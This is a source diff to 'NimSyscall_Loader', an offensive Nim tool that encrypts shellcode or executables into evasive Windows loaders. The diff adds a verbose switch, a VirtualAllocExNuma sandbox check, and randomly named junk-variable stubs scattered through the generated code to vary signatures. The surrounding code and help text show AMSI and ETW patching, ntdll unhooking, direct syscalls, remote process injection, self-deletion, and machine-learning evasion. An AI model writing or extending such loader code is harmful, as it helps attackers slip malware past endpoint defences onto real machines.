@@ -6,7 +6,6 @@
 
 import nimcrypto
 import nimcrypto/sysrand
-import base64
 import strformat
 import strutils
 import sugar
@@ -14,6 +13,7 @@ import os
 import osproc
 import docopt
 import random
+import base64
 import winim
 import streams
 when system.hostOS == "windows":
@@ -61,7 +61,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.6
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -84,10 +84,11 @@ Options:
   --hide    Compile with --app:gui flag, so that the console won't pop up
   --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
-  --debug    Compiles the binary in debug mode (More DInvoke output)
+  --debug    Compiles the binary in debug mode
   --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
   --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
+  --verbose    Prints output to the console (for troubleshooting purposes)
 
 [evasion]
 
@@ -102,6 +103,7 @@ Options:
                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                      DiskSpace -> Only execute if c:\ disk space >= 200GB
                      MemorySpace -> Only execute if more than 4GB RAM available
+                     Emulated -> VirtualAllocExNuma API call (Some sandboxes do not emulate that)
         --domain targetdomain    Specify a domain for SandBox Evasion
   --pump value    Pump the file with:
                   words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
@@ -177,6 +179,7 @@ var
     localCreateThread: bool = false
     localinject: bool = true
     unhook: bool = false
+    verbose: bool = false
     denim: bool = false
     llvm: bool = false
     gosleep: bool = false
@@ -397,6 +400,9 @@ if args["--antidebug"]:
 if args["--x86"]:
   compileX86 = true
 
+if args["--verbose"]:
+  verbose = true
+
 if args["--noDInvoke"]:
   noDInvoke = true
 
@@ -514,13 +520,12 @@ ectx.encrypt(plaintext, enctext)
 ectx.clear()
 
 #let encoded = encode(enctext)
+let encodedIV = encode(iv)
 echo "Writing encrypted blob to disk: "
 
 var content: string = cast[string](enctext)
 writeFile("enc.blob", content)
 
-let encodedIV = encode(iv)
-let encodedenvkey = encode(envkey)
 
 let PatchargsFuncs = fmt"""
 var arguments: string = "{arguments}"
@@ -536,26 +541,32 @@ when defined(args):
             var hProcess = GetCurrentProcess()
         when defined(Syswhispers):
             status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
-            echo obf("NtProtectVirtualMemory: "),toHex(status)
+            when defined(verbose):
+                echo obf("NtProtectVirtualMemory: "),toHex(status)
             if (status != 0):
-                echo obf("[-] Failed to change memory protections.")
-                echo toHex(status)
+                when defined(verbose):
+                    echo obf("[-] Failed to change memory protections.")
+                when defined(verbose):
+                    echo toHex(status)
         else:
             when defined(HellsGate):
                 if getSyscall(ntProtectTable):                
                     syscall = ntProtectTable.wSysCall
                 else:
-                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
             status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
             if (status != 0):
-                echo obf("[-] Failed to change memory protections.")
-                echo toHex(status)
+                when defined(verbose):
+                    echo obf("[-] Failed to change memory protections.")
+                    echo toHex(status)
             
         when defined(Hellsgate):
             if getSyscall(ntWriteTable):
                 syscall = ntWriteTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
         var scLength: SIZE_T = SIZE_T(len(data))
         var bytesWritten: SIZE_T
             
@@ -563,12 +574,16 @@ when defined(args):
             status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
         else:
             status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
-            echo obf("NtWriteVirtualMemory: "),toHex(status)
+            when defined(verbose):
+                echo obf("NtWriteVirtualMemory: "),toHex(status)
             if (status != 0):
-                echo obf("[-] Failed to write arguments.")
-                echo toHex(status)
+                when defined(verbose):
+                    echo obf("[-] Failed to write arguments.")
+                when defined(verbose):
+                    echo toHex(status)
             else:
-                echo obf("[+] Arguments written successfully.")
+                when defined(verbose):
+                    echo obf("[+] Arguments written successfully.")
         when defined(Syswhispers):
             status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
         else:
@@ -576,7 +591,8 @@ when defined(args):
                 if getSyscall(ntProtectTable):                
                     syscall = ntProtectTable.wSysCall
                 else:
-                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
             success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
 when defined(args):
     proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
@@ -622,9 +638,11 @@ when defined(Fluctuate):
     g_fluctuationData.protect = PAGE_READWRITE
     g_fluctuate = FluctuateToRW
     if (hookSleep()):
-        echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+        when defined(verbose):
+            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
     else:
-        echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
+        when defined(verbose):
+            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
 
 var cmd: seq[string]
 var i = 1
@@ -660,8 +678,10 @@ import winim/lean
 """
 
 let SleepStubSecond * = fmt"""
-echo obf("[*] Sleeping to avoid in memory scanners")
-echo {sleeptime}
+when defined(verbose):
+    echo obf("[*] Sleeping to avoid in memory scanners")
+when defined(verbose):
+    echo {sleeptime}
 HowMuchTimeWouldYoulikeToSleep({sleeptime}) 
 """
 
@@ -669,7 +689,8 @@ let DomainCheckStub1 * = fmt"""
 when isMainModule:
     var localdomain: string = getDomain()
     if(localdomain != "{targetdomain}"):
-        echo obf("Domain not EQUAL, target / local :") & $localdomain & " / {targetdomain}"
+        when defined(verbose):
+            echo obf("Domain not EQUAL, target / local :") & $localdomain & " / {targetdomain}"
         quit()
 """
 
@@ -686,8 +707,8 @@ import winim/lean
 #from winim import winstr,winimbase,windef
 import strformat
 from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
-import base64
 import strutils
+import base64
 import ptr_math
 import strenc
 when defined(Fluctuate):
@@ -741,9 +762,9 @@ var dctx: CTR[aes256]
 let Cryptstub2 = fmt"""
 var enctext: seq[byte] = toByteSeq(encstring)
 var key: array[aes256.sizeKey, byte]
-var envkey: string = decode("{encodedenvkey}")
+var envkey: string = obf("{envkey}")
 var iv: array[aes256.sizeBlock, byte]
-var pp: string = decode("{encodedIV}")
+var pp: string = decode(obf("{encodedIV}"))
 """
 
 let Cryptstub3 = fmt"""
@@ -812,16 +833,19 @@ proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : st
         TempFunctionName : string = ""
 
     if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
-        echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
+        when defined(verbose):
+            echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
         return NULL
     if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
-        echo obf("Failed to Read and check the NT signature: "), GetlastError()
+        when defined(verbose):
+            echo obf("Failed to Read and check the NT signature: "), GetlastError()
         return NULL
 
     ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
     
     if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
-        echo obf("Failed to Read the main export table "), GetlastError()
+        when defined(verbose):
+            echo obf("Failed to Read the main export table "), GetlastError()
 
     ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
     ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
@@ -831,10 +855,12 @@ proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : st
         Func = 0
         Ord = 0 
         if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
-            echo obf("Failed to copy name table "), GetlastError()
+            when defined(verbose):
+                echo obf("Failed to copy name table "), GetlastError()
             return NULL
         if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
-            echo obf("Failed to copy Ordinal table "), GetlastError()
+            when defined(verbose):
+                echo obf("Failed to copy Ordinal table "), GetlastError()
             return NULL
         ExportNameTable.add(Func)
         ExportOrdinalsTable.add(Ord)
@@ -842,7 +868,8 @@ proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : st
     for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
         Func = 0
         if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
-            echo obf("Failed to copy fucntion table "), GetlastError()
+            when defined(verbose):
+                echo obf("Failed to copy fucntion table "), GetlastError()
             return NULL
         ExportFunctionTable.add(Func)
     
@@ -852,7 +879,8 @@ proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : st
         TempFunctionName = ""
         while Done == false:
             if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
-                echo obf("Failed to read the names of the functions"), GetlastError()
+                when defined(verbose):
+                    echo obf("Failed to read the names of the functions"), GetlastError()
                 return NULL
             if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
                 Done = true
@@ -861,7 +889,8 @@ proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : st
             CharIndex += 1
         if TempFunctionName == FuncName:
             return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
-    echo obf("[X] Proc name does not exits")
+    when defined(verbose):
+        echo obf("[X] Proc name does not exits")
     return NULL
 
 """
@@ -996,7 +1025,8 @@ when defined(DInvoke):
 
     var hwnd: HANDLE = MyGetConsoleWindow()
     var hidden: bool = MyShowWindow(hwnd, SW_HIDE)
-    echo "Hidden:", hidden
+    when defined(verbose):
+        echo "Hidden:", hidden
 
 else:]#
 var hwnd: HANDLE
@@ -1015,10 +1045,21 @@ let tProcess = startProcess(obf("{customspawnprocess}"))
 tProcess.suspend() # That's handy!
 tProcess.close()
 
-echo obf("[*] Target Process: "), tProcess.processID
+when defined(verbose):
+    echo obf("[*] Target Process: "), tProcess.processID
 var remoteProcID = DWORD(tProcess.processID)
 
 """
+
+proc getRandStub (): string =
+  var randName: string = rndStr(rand(10..25))
+  var randValues: string = rndStr(rand(50..500))
+  let randstub = fmt"""
+
+var {randName}: string = obf("{randValues}")
+
+"""
+  return randstub
 
 let BeingDebugged * = fmt"""
 import AntiDebug
@@ -1044,6 +1085,8 @@ if(pump):
 if(antidebug):
     stub.add(BeingDebugged)
 
+stub.add(getRandStub())
+
 if(sandbox):
     if (not noDInvoke): stub.add(DInvokeSandBoxStub)
     for m in sandboxchecks:
@@ -1056,6 +1099,8 @@ if(sandbox):
             stub.add(DomainJoinStub)
         if (m == "MemorySpace"):
             stub.add(MemorySpaceStub)
+        if (m == "Emulated"):
+            stub.add(VirtualAlloxExNumaCheckStub)
 
 if (apihide):
     stub.add(APIHideStub)
@@ -1064,6 +1109,7 @@ if(gosleep):
     stub.add(SleepStubFirst)
     stub.add(SleepStubSecond)
 
+stub.add(getRandStub())
 
 if (getfreshstub):
     stub.add(GetSyscallStub)
@@ -1074,6 +1120,8 @@ if (syswhispers):
         stub.add(WhispersJumpStub)
     else:
         stub.add(WhispersStub)
+
+stub.add(getRandStub())
 
 if(unhook):
     if(hellsgate):
@@ -1105,17 +1153,22 @@ else:
     elif(getfreshstub):
         stub.add(NtProtectVirtualMemoryDelegate)
         stub.add(NtWriteVirtualMemoryDelegate)
-
+stub.add(getRandStub())
 # Only decrypt when sandbox Checks/Unhooking/Sleep is done
+stub.add(getRandStub())
 stub.add(Cryptstub2)
+stub.add(getRandStub())
+stub.add(getRandStub())
 stub.add(Cryptstub3)
+stub.add(getRandStub())
+stub.add(getRandStub())
 
 if (AMSI or ETW or peload or (localinject == false) or selfdelete):
     if (not noDInvoke): stub.add(DInvokeLoadLibraryAGetProcAddress)
     if (selfdelete):
         if (not noDInvoke): stub.add(DInvokeSelfDeleteStubs)
         stub.add(FileDeleteStub)
-
+stub.add(getRandStub())
 if (localinject):
     if (AMSI):
         stub.add(AMSIStub)
@@ -1124,14 +1177,14 @@ if (localinject):
             stub.add(ETWCOMVARStub)
         else:
             stub.add(ETWPatchStub)
-
+stub.add(getRandStub())
 if (remoteETWpatch or remoteAMSIpatch):
     stub.add(RemoteModuleHandleStub)
     if (gosleep == false):
         stub.add(SleepStubFirst)
     if (unhook == false):
         if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
-
+stub.add(getRandStub())
 if(dll_out):
     if (processname == ""):
         stub.add(DllStub)
@@ -1143,7 +1196,7 @@ if(dll_out):
         for f in dllexportfunctions:
             stub.add(DllCustomExportStubRemoteInj)
             stub = stub.replace("FUNC_EXPORT", f)
-
+stub.add(getRandStub())
 if (peload):
     if (localinject):
         if (embeddedArguments):
@@ -1157,6 +1210,7 @@ if (peload):
             stub.add(PELoadStub)
         elif(syswhispers):
             stub.add(PELoadStub)
+        stub.add(getRandStub())
     else:   
         stub.add(RemoteProcImportStub)
         if (hellsgate):
@@ -1184,6 +1238,8 @@ if (peload):
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
             stub.add(ShellcoderemoteinjectStub)
+            stub.add(getRandStub())
+            stub.add(getRandStub())
 
 if (shellcode):
     if (localinject):
@@ -1195,9 +1251,12 @@ if (shellcode):
             if (localCreateThread):
                 stub.add(HellsgateNtCreateThreadExDelegate)
             stub.add(HellsgateAllocDelegate)
+        stub.add(getRandStub())
         stub.add(LocalInjectStub)
+        stub.add(getRandStub())
     else:
         stub.add(Winimleanstub)
+        stub.add(getRandStub())
         if (getfreshstub):
             stub.add(RemoteProcImportStub)
         if (hellsgate):
@@ -1219,19 +1278,24 @@ if (shellcode):
                 stub.add(ShellcoderemoteinjectStub_customprocID)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
+                    stub.add(getRandStub())
                     stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(RemoteLoadAMSIStub)
+                    stub.add(getRandStub())
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
         elif(syswhispers):
             if (processname == ""):
+                stub.add(getRandStub())
                 stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
+                    stub.add(getRandStub())
                     stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(RemoteLoadAMSIStub)
+                    stub.add(getRandStub())
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_notepad)
             else:
@@ -1240,21 +1304,27 @@ if (shellcode):
                 stub.add(ShellcoderemoteinjectStub_customprocID)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
+                    stub.add(getRandStub())
                     stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(RemoteLoadAMSIStub)
+                    stub.add(getRandStub())
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
         elif (getfreshstub):
             stub.add(RemoteInjectDelegates)
+            stub.add(getRandStub())
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
+                    stub.add(getRandStub())
                     stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(RemoteLoadAMSIStub)
+                    stub.add(getRandStub())
                     stub.add(RemotePatchAMSIStub)
+                stub.add(getRandStub())
                 stub.add(ShellcoderemoteinjectStub_notepad)
             else:
                 stub.add(ShellcoderemoteinjectStub_customprocfirst)
@@ -1262,6 +1332,7 @@ if (shellcode):
                 stub.add(ShellcoderemoteinjectStub_customprocID)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
+                    stub.add(getRandStub())
                     stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
                     stub.add(RemoteLoadAMSIStub)
@@ -1269,15 +1340,22 @@ if (shellcode):
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
             
         stub.add(ShellcoderemoteinjectStub)
+        stub.add(getRandStub())
 
 if (csharp):
     stub.add(AssemblyImports)
+    stub.add(getRandStub())
     if (noArgs):
         stub.add(LoadAssemblyStub)
+        stub.add(getRandStub())
         stub.add(LoadAssemblyStubNoArgs)
+        stub.add(getRandStub())
     else:
+        stub.add(getRandStub())
         stub.add(LoadAssemblyStub)
+        stub.add(getRandStub())
         stub.add(LoadAssemblyStubArgs)
+        stub.add(getRandStub())
 
 if (pump):
     for m in pumpargs:
@@ -1345,6 +1423,8 @@ elif(getfreshstub):
 elif(syswhispers):
     basicCompileFlags.add("-d:SysWhispers ")
 
+if (verbose):
+    basicCompileFlags.add("-d:verbose ")
 
 if embeddedArguments:
     basicCompileFlags.add("-d:args ")
@@ -1406,7 +1486,7 @@ if(denim == false):
     basicCompileFlags.add(fmt"--out={outfile} Loader.nim")
 
 if debugMode:
-    basicCompileFlags = basicCompileFlags.replace("-d:debug", "")
+    basicCompileFlags = basicCompileFlags.replace("-d:release", "-d:debug")
     basicCompileFlags = basicCompileFlags.replace("--hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size", "")
     basicCompileFlags = basicCompileFlags.replace("--app=console --passc=-flto --passl=-flto", "")
 
